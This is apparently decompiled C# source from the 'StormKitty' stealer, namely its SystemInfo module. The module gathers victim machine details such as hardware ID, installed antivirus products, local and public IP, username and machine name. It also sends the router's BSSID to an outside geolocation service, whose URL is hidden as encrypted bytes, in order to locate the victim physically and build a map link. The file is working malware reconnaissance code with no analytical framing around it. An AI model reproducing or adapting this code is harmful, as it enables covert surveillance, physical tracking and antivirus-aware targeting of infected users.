using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using StormKitty.Implant;

namespace StormKitty
{
	// Token: 0x02000050 RID: 80
	internal sealed class SystemInfo
	{
		// Token: 0x0600014B RID: 331
		[DllImport("iphlpapi.dll", ExactSpelling = true)]
		private static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);

		// Token: 0x0600014C RID: 332 RVA: 0x0000B5EC File Offset: 0x000097EC
		public static string ScreenMetrics()
		{
			Rectangle bounds = Screen.GetBounds(Point.Empty);
			int width = bounds.Width;
			int height = bounds.Height;
			return width.ToString() + "x" + height.ToString();
		}

		// Token: 0x0600014D RID: 333 RVA: 0x0000B62C File Offset: 0x0000982C
		public static string GetBattery()
		{
			try
			{
				string str = SystemInformation.PowerStatus.BatteryChargeStatus.ToString();
				string[] array = SystemInformation.PowerStatus.BatteryLifePercent.ToString().Split(new char[]
				{
					','
				});
				string str2 = array[array.Length - 1];
				return str + " (" + str2 + "%)";
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600014E RID: 334 RVA: 0x0000B6AC File Offset: 0x000098AC
		private static string GetWindowsVersionName()
		{
			string text = "Unknown System";
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem"))
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						text = Convert.ToString(((ManagementObject)managementBaseObject)["Name"]);
					}
					text = text.Split(new char[]
					{
						'|'
					})[0];
					int length = text.Split(new char[]
					{
						' '
					})[0].Length;
					text = text.Substring(length).TrimStart(new char[0]).TrimEnd(new char[0]);
				}
			}
			catch
			{
			}
			return text;
		}

		// Token: 0x0600014F RID: 335 RVA: 0x0000B794 File Offset: 0x00009994
		private static string GetBitVersion()
		{
			try
			{
				if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0").GetValue("Identifier").ToString().Contains("x86"))
				{
					return "(32 Bit)";
				}
				return "(64 Bit)";
			}
			catch
			{
			}
			return "(Unknown)";
		}

		// Token: 0x06000150 RID: 336 RVA: 0x0000B7F8 File Offset: 0x000099F8
		public static string GetSystemVersion()
		{
			return SystemInfo.GetWindowsVersionName() + " " + SystemInfo.GetBitVersion();
		}

		// Token: 0x06000151 RID: 337 RVA: 0x0000B810 File Offset: 0x00009A10
		public static string GetHardwareID()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("Select ProcessorId From Win32_processor").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["ProcessorId"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000152 RID: 338 RVA: 0x0000B890 File Offset: 0x00009A90
		public static string GetDefaultGateway()
		{
			try
			{
				return (from a in (from n in NetworkInterface.GetAllNetworkInterfaces()
				where n.OperationalStatus == OperationalStatus.Up
				where n.NetworkInterfaceType != NetworkInterfaceType.Loopback
				select n).SelectMany(delegate(NetworkInterface n)
				{
					IPInterfaceProperties ipproperties = n.GetIPProperties();
					if (ipproperties == null)
					{
						return null;
					}
					return ipproperties.GatewayAddresses;
				}).Select(delegate(GatewayIPAddressInformation g)
				{
					if (g == null)
					{
						return null;
					}
					return g.Address;
				})
				where a != null
				select a).FirstOrDefault<IPAddress>().ToString();
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000153 RID: 339 RVA: 0x0000B980 File Offset: 0x00009B80
		public static string GetAntivirus()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct"))
				{
					List<string> list = new List<string>();
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						list.Add(managementBaseObject["displayName"].ToString());
					}
					if (list.Count == 0)
					{
						return "Not installed";
					}
					return string.Join(", ", list.ToArray()) + ".";
				}
			}
			catch
			{
			}
			return "N/A";
		}

		// Token: 0x06000154 RID: 340 RVA: 0x0000BA60 File Offset: 0x00009C60
		public static string GetLocalIP()
		{
			try
			{
				foreach (IPAddress ipaddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						return ipaddress.ToString();
					}
				}
			}
			catch
			{
			}
			return "No network adapters with an IPv4 address in the system!";
		}

		// Token: 0x06000155 RID: 341 RVA: 0x0000BAC0 File Offset: 0x00009CC0
		public static string GetPublicIP()
		{
			try
			{
				return new WebClient().DownloadString(StringsCrypt.Decrypt(new byte[]
				{
					172,
					132,
					62,
					84,
					188,
					245,
					252,
					173,
					117,
					82,
					97,
					91,
					237,
					238,
					214,
					39,
					28,
					15,
					241,
					23,
					15,
					251,
					204,
					131,
					247,
					237,
					166,
					92,
					82,
					85,
					22,
					172
				})).Replace("\n", "");
			}
			catch
			{
			}
			return "Request failed";
		}

		// Token: 0x06000156 RID: 342 RVA: 0x0000BB1C File Offset: 0x00009D1C
		private static string GetBSSID()
		{
			byte[] array = new byte[6];
			uint num = (uint)array.Length;
			try
			{
				if (SystemInfo.SendARP(BitConverter.ToInt32(IPAddress.Parse(SystemInfo.GetDefaultGateway()).GetAddressBytes(), 0), 0, array, ref num) != 0)
				{
					return "unknown";
				}
				string[] array2 = new string[num];
				int num2 = 0;
				while ((long)num2 < (long)((ulong)num))
				{
					array2[num2] = array[num2].ToString("x2");
					num2++;
				}
				return string.Join(":", array2);
			}
			catch
			{
			}
			return "Failed";
		}

		// Token: 0x06000157 RID: 343 RVA: 0x0000BBB4 File Offset: 0x00009DB4
		public static string GetLocation()
		{
			string bssid = SystemInfo.GetBSSID();
			string text = "Unknown";
			string text2 = "Unknown";
			string text3 = "Unknown";
			string text4;
			try
			{
				using (WebClient webClient = new WebClient())
				{
					text4 = webClient.DownloadString(StringsCrypt.Decrypt(new byte[]
					{
						91,
						185,
						159,
						48,
						60,
						79,
						139,
						159,
						124,
						37,
						212,
						232,
						253,
						2,
						176,
						189,
						141,
						243,
						199,
						107,
						13,
						252,
						71,
						66,
						122,
						29,
						213,
						176,
						205,
						11,
						172,
						67,
						107,
						43,
						94,
						178,
						129,
						142,
						99,
						210,
						172,
						1,
						13,
						123,
						158,
						81,
						183,
						66,
						byte.MaxValue,
						162,
						185,
						157,
						75,
						7,
						48,
						125,
						76,
						21,
						246,
						190,
						35,
						164,
						108,
						141
					}) + bssid);
				}
			}
			catch
			{
				return "BSSID: " + bssid;
			}
			if (!text4.Contains("{\"result\":200"))
			{
				return "BSSID: " + bssid;
			}
			int num = 0;
			string[] array = text4.Split(new char[]
			{
				' '
			});
			foreach (string text5 in array)
			{
				num++;
				if (text5.Contains("\"lat\":"))
				{
					text = array[num].Replace(",", "");
				}
				if (text5.Contains("\"lon\":"))
				{
					text2 = array[num].Replace(",", "");
				}
				if (text5.Contains("\"range\":"))
				{
					text3 = array[num].Replace(",", "");
				}
			}
			string text6 = string.Concat(new string[]
			{
				"BSSID: ",
				bssid,
				"\nLatitude: ",
				text,
				"\nLongitude: ",
				text2,
				"\nRange: ",
				text3
			});
			if (text != "Unknown" && text2 != "Unknown")
			{
				text6 = string.Concat(new string[]
				{
					text6,
					"\n[Open google maps](",
					StringsCrypt.Decrypt(new byte[]
					{
						206,
						105,
						162,
						71,
						154,
						101,
						143,
						133,
						216,
						233,
						4,
						78,
						251,
						231,
						127,
						197,
						50,
						50,
						5,
						167,
						22,
						30,
						67,
						50,
						30,
						134,
						116,
						165,
						251,
						47,
						202,
						115,
						111,
						224,
						166,
						249,
						5,
						156,
						140,
						131,
						223,
						55,
						212,
						39,
						236,
						254,
						69,
						45
					}),
					text,
					" ",
					text2,
					")"
				});
			}
			return text6;
		}

		// Token: 0x06000158 RID: 344 RVA: 0x0000BDA8 File Offset: 0x00009FA8
		public static string GetCPUName()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["Name"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000159 RID: 345 RVA: 0x0000BE2C File Offset: 0x0000A02C
		public static string GetGPUName()
		{
			try
			{
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((ManagementObject)enumerator.Current)["Name"].ToString();
					}
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x0600015A RID: 346 RVA: 0x0000BEB0 File Offset: 0x0000A0B0
		public static string GetRamAmount()
		{
			try
			{
				int num = 0;
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							num = (int)(Convert.ToDouble(((ManagementObject)enumerator.Current)["TotalPhysicalMemory"]) / 1048576.0);
						}
					}
				}
				return num.ToString() + "MB";
			}
			catch
			{
			}
			return "-1";
		}

		// Token: 0x04000091 RID: 145
		public static string username = Environment.UserName;

		// Token: 0x04000092 RID: 146
		public static string compname = Environment.MachineName;

		// Token: 0x04000093 RID: 147
		public static string culture = CultureInfo.CurrentCulture.ToString();

		// Token: 0x04000094 RID: 148
		public static string datenow = DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt");
	}
}
